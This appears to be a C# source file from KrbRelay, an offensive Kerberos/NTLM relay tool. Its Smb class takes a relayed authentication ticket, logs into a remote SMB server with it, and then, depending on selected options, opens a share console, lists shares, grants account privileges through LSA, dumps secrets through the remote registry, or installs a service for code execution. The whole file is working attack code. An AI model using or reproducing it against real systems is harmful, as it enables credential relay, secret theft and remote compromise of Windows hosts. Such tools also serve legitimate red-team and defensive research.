using KrbRelay.Clients.Attacks.Smb;
//using KrbRelay.Com;
using SMBLibrary.Client;
using SMBLibrary.Services;
using System;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Reflection;
using System.Threading.Tasks;
using static KrbRelay.Program;

namespace KrbRelay.Clients
{
    public class Smb
    {
        private Socket _clientSocket = null;
        public bool  alreadyLoggedIn = false;
        public Smb()
        {
            ;

        }
        public Smb(Socket clientSocket)
        {
            _clientSocket = clientSocket;

        }

        public void smbLogin(SMB2Client smbc, byte[] apreqBuffer)
        {

        }
        public void smbConnectfromRPC(SMB2Client smbc, byte[] apreqBuffer)
        {

            byte[] b = new byte[2];
            int fraglen, authlen;

            Array.Copy(Program.apreqBuffer, 8, b, 0, 2);

            fraglen = BitConverter.ToInt16(b, 0);
            Array.Copy(Program.apreqBuffer, 10, b, 0, 2);
            authlen = BitConverter.ToInt16(b, 0);
            byte[] destinationArray = new byte[authlen]; // Subtract 3 for skipping the first 3 bytes

            Array.Copy(Program.apreqBuffer, fraglen - authlen, destinationArray, 0, authlen);

            ticket = destinationArray;
            byte[] response = smbClient.Login(ticket, out bool success);
            Console.WriteLine("[*] Login {0}",success);
            //Console.WriteLine("[*] SMB [{0}] Login success: {1}",_clientSocket.RemoteEndPoint, success);

            if (!success)
            {
                if (Program.ntlm)
                {
                    ntlm2 = response;
                    Console.WriteLine("[*] NTLM2: {0}", Helpers.ByteArrayToString(ntlm2));
                }
                else
                {
                    apRep1 = response;
                    Console.WriteLine("[*] apRep1: {0}", Helpers.ByteArrayToString(apRep1));

                }
            }
            else
            {

                //Program.stream.Close();
                Console.WriteLine("[+] SMB session established");
                //Task.Run(() => tcpFwd.StartPortFwd("192.168.1.79", "445", Program.RedirectHost, "445"));
                //Task.Run(() => Program.tcpFwd.Start());

                //Console.WriteLine("[*] Now starting redirector to {0} port 445  for serving other requests", Program.RedirectHost);


                try
                {
                    if (attacks.Keys.Contains("console"))
                    {
                        nscShares smbs = new nscShares();
                        if (_clientSocket == null)

                            smbs.smbConsole(smbc);
                        else
                            smbs.smbConsole(smbc, _clientSocket);
                    }
                    if (attacks.Keys.Contains("list"))
                    {
                        Attacks.Smb.Shares.listShares(smbc);
                    }
                    if (attacks.Keys.Contains("add-privileges"))
                    {
                        Attacks.Smb.LSA.AddAccountRights(smbClient, attacks["add-privileges"]);
                    }
                    if (attacks.Keys.Contains("secrets"))
                    {
                        Attacks.Smb.RemoteRegistry.secretsDump(smbc, false);
                    }
                    if (attacks.Keys.Contains("service-add"))
                    {
                        string arg1 = attacks["service-add"].Split(new[] { ' ' }, 2)[0];
                        string arg2 = attacks["service-add"].Split(new[] { ' ' }, 2)[1];

                        Attacks.Smb.ServiceManager.serviceInstall(smbc, arg1, arg2);
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine("[-] {0}", e);
                }

                //Console.WriteLine("[*] SMB [{0}] Logging off", _clientSocket.RemoteEndPoint);

                //Environment.Exit(0);
            }
        }


        public void smbConnect(SMB2Client smbc, byte[] apreqBuffer)
        {

            // Read the binary file into a byte array
            //byte[] byteArray;

            byte[] b = new byte[2];
            int fraglen, authlen;
            //Program.apreqBuffer = byteArray;
            //Array.Copy(Program.apreqBuffer, 8, b, 0, 2);
            Array.Copy(apreqBuffer, 8, b, 0, 2);



            fraglen = BitConverter.ToInt16(b, 0);
            Array.Copy(apreqBuffer, 10, b, 0, 2);

            authlen = BitConverter.ToInt16(b, 0);


            
            byte[] destinationArray = new byte[authlen]; 
                                                         
                                                         
            ticket = apreqBuffer;

            byte[] response = null;
            bool success = true;
            if (!alreadyLoggedIn)
            {
                response = smbc.Login(ticket, out success);

                //Console.WriteLine("[*] SMB [{0}] Login success: {1}",smbc.currSocketServer.state.SourceSocket.RemoteEndPoint, success);
                //if(smbc.currSocketServer != null)
                  //  Console.WriteLine("[*] SMB [{0}] Login  success: {1}",smbc.currSocketServer.state.SourceSocket.RemoteEndPoint, success);
                //else
                    Console.WriteLine("[*] SMB Login  success: {0}",  success);
            }

            if (!success)
            {
                
                if (Program.ntlm)
                {
                    ntlm2 = response;
                    Console.WriteLine("[*] NTLM2: {0}", Helpers.ByteArrayToString(ntlm2));
                }
                else
                {
                    apRep1 = response;
                    Console.WriteLine("[*] apRep1: {0}", Helpers.ByteArrayToString(apRep1));

                }
            }
            else
            {

                
                //Program.stream.Close();
                //Console.WriteLine("[+] SMB [{0}] Session Established", smbc.currSocketServer.state.SourceSocket.RemoteEndPoint, success);
                //Program.InterceptKey = false;
                //Task.Run(() => tcpFwd.StartPortFwd("192.168.1.79", "445", Program.RedirectHost, "445"));
                //Task.Run(() => Program.tcpFwd.Start());

                //Console.WriteLine("[*] Now starting redirector to {0} port 445  for serving other requests", Program.RedirectHost);


                try
                {
                    if (attacks.Keys.Contains("console"))
                    {
                        nscShares smbs = new nscShares();
                        if (_clientSocket == null)

                            smbs.smbConsole(smbc);
                        else
                            smbs.smbConsole(smbc, _clientSocket);
                    }
                    if (attacks.Keys.Contains("list"))
                    {
                        Attacks.Smb.Shares.listShares(smbc);
                    }
                    if (attacks.Keys.Contains("add-privileges"))
                    {
                        Attacks.Smb.LSA.AddAccountRights(smbClient, attacks["add-privileges"]);
                    }
                    if (attacks.Keys.Contains("secrets"))
                    {
                        Attacks.Smb.RemoteRegistry.secretsDump(smbc, false);
                    }
                    if (attacks.Keys.Contains("service-add"))
                    {
                        string arg1 = attacks["service-add"].Split(new[] { ' ' }, 2)[0];
                        string arg2 = attacks["service-add"].Split(new[] { ' ' }, 2)[1];

                        Attacks.Smb.ServiceManager.serviceInstall(smbc, arg1, arg2);
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine("[-] {0}", e);
                }
                Program.InterceptKey = true;
                //Console.WriteLine("[*] SMB [{0}] Logging off", _clientSocket.RemoteEndPoint);

                //Environment.Exit(0);
            }
        }

    }

}